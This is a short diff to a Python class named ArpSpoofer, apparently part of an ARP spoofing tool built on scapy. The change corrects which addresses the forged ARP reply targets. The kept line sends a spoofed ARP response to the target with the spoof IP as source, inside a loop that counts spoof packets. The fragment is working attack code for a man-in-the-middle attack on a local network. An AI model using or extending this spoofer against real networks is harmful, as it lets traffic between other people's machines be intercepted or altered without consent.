@@ -67,8 +67,7 @@ class ArpSpoofer(object):
         # Get the MAC address of the target
         target_mac = self.get_target_mac()
 
-        # arp_response = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
-        arp_response = ARP(op=2, pdst=self.spoof_ip, hwdst=target_mac, psrc=self.target_ip)
+        arp_response = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
         scapy.send(arp_response, iface=IFACE, verbose=0)
         print(f"Sending spoof number {self.spoof_count}")
         self.spoof_count += 1
